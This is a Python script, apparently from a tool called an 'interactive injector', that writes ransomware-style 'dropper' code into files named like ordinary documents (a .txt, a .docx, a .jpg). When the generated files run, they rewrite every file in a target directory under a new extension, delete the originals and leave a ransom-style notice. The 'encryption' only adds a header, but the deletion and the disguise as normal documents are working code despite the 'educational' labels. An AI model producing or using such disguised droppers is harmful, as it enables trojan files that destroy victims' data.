"""
Demonstration of how the interactive injector should create working droppers.
This shows the concept that when you select a file in the GUI and create a dropper,
the resulting file should encrypt the target directory when opened.
"""

import os
import sys
from pathlib import Path

def demonstrate_working_dropper_creation():
    """Show how to create a file that becomes a working dropper."""
    
    print("=" * 60)
    print("INTERACTIVE INJECTOR - WORKING DROPPER DEMONSTRATION")
    print("=" * 60)
    
    # Simulate what the GUI would do
    target_files = ["document1.txt", "report.docx", "image.jpg"]
    target_directory = "data/test_files"
    dropper_extension = ".dropper"
    
    print(f"Selected files to convert: {target_files}")
    print(f"Target directory for encryption: {target_directory}")
    print(f"Encrypted file extension: {dropper_extension}")
    
    print("\nCreating working droppers...")
    
    for filename in target_files:
        # Create the dropper content
        dropper_content = create_self_executing_dropper(filename, target_directory, dropper_extension)
        
        # Write the dropper file
        with open(filename, 'w') as f:
            f.write(dropper_content)
        
        print(f"  Created dropper: {filename} (will encrypt {target_directory} when opened)")
    
    print("\n" + "=" * 60)
    print("DROPPER CREATION COMPLETE")
    print("These files now contain self-executing ransomware code!")
    print("When opened, they will encrypt the target directory.")
    print("=" * 60)

def create_self_executing_dropper(original_filename, target_dir, extension):
    """Create content for a self-executing dropper file."""
    
    # This creates a file that appears to be a normal document
    # but contains executable code that runs when the file is opened/executed
    
    dropper_template = f'''#!/usr/bin/env python3
"""
Seemingly Normal Document File
Appears to be a regular {original_filename.split('.')[-1]} file
But contains hidden self-executing ransomware dropper
"""

# Normal document content that users expect to see
document_content = """
This is the content of what appears to be a normal document file.
Users would expect this to be regular content when they open the file.
In reality, this file contains hidden malicious code.
"""

# HIDDEN RANSOMWARE DROPPER CODE
# This code executes when the file is run/opened

import os
import sys
import time
from pathlib import Path

def activate_ransomware():
    """Hidden dropper that activates on file execution."""
    
    print("=" * 50)
    print("⚠️  EDUCATIONAL RANSOMWARE DROPPER ACTIVATED ⚠️")
    print("=" * 50)
    print("This file contains embedded dropper functionality!")
    print("Educational demonstration only.")
    print("=" * 50)
    
    # Configuration
    TARGET_DIR = "{target_dir}"
    ENCRYPTED_EXT = "{extension}"
    DELAY_SECONDS = 1
    
    print(f"[TARGET] Encrypting files in: {{TARGET_DIR}}")
    time.sleep(DELAY_SECONDS)
    
    target_path = Path(TARGET_DIR)
    if not target_path.exists():
        print("[ERROR] Target directory not found")
        return
    
    encrypted_files = []
    
    # Encrypt all files in target directory
    for file_path in target_path.rglob("*"):
        if (file_path.is_file() and 
            not file_path.name.endswith(ENCRYPTED_EXT) and
            file_path.name != "AUTO_DROPPER_NOTICE.txt"):
            
            try:
                # Read original file
                with open(file_path, 'rb') as f:
                    data = f.read()
                
                # Create encrypted version (educational simulation)
                encrypted_path = str(file_path) + ENCRYPTED_EXT
                with open(encrypted_path, 'wb') as f:
                    f.write(b"# EDUCATIONAL AUTO-DROPPER SIMULATION\\n")
                    f.write(b"# File processed by self-executing dropper\\n")
                    f.write(b"# Original content preserved for recovery demo\\n")
                    f.write(b"=====================================\\n")
                    f.write(data)
                
                # Delete original file
                file_path.unlink()
                encrypted_files.append(file_path.name)
                print(f"[ENCRYPTED] {{file_path.name}}")
                
            except Exception as e:
                print(f"[ERROR] Failed to process {{file_path.name}}: {{e}}")
    
    # Create educational notice
    notice = f"""
===============================================
    AUTOMATIC DROPPER RANSOMWARE SIMULATION
===============================================

This dropper automatically activated when the file was opened.
It encrypted {{len(encrypted_files)}} files in: {{TARGET_DIR}}

Files received extension: {{ENCRYPTED_EXT}}

This demonstrates how droppers work in real ransomware.
The malicious code was hidden within what appeared to be
a normal document file.

===============================================
        EDUCATIONAL SIMULATION ONLY
===============================================
"""
    
    notice_path = target_path / "AUTO_DROPPER_NOTICE.txt"
    with open(notice_path, 'w') as f:
        f.write(notice)
    
    print(f"[NOTE] Created notice: {{notice_path.name}}")
    print(f"\\n[COMPLETE] Encrypted {{len(encrypted_files)}} files")

# KEY PART: Code executes when file is run
if __name__ == "__main__":
    # When someone opens/opens this file, the dropper activates
    activate_ransomware()
else:
    # When imported/viewed normally, shows document content
    print(document_content)

# End of file - appears normal to casual inspection
'''
    
    return dropper_template

def test_dropper_functionality():
    """Test that the dropper concept works."""
    print("\n" + "=" * 40)
    print("TESTING DROPPER FUNCTIONALITY")
    print("=" * 40)
    
    # Create a test dropper
    test_content = create_self_executing_dropper("test_doc.txt", "data/test_files", ".auto_test")
    
    # Write test file
    test_filename = "auto_test_dropper.py"
    with open(test_filename, 'w') as f:
        f.write(test_content)
    
    print(f"Created test dropper: {test_filename}")
    print("This file will encrypt test_files when executed.")
    
    # Show what the file looks like to users
    print("\nFile appearance to users:")
    print("-" * 30)
    print("Seemingly Normal Document File")
    print("Appears to be a regular txt file")
    print("But contains hidden self-executing ransomware dropper")
    print("-" * 30)
    
    print(f"\nTo test: python {test_filename}")

if __name__ == "__main__":
    demonstrate_working_dropper_creation()
    test_dropper_functionality()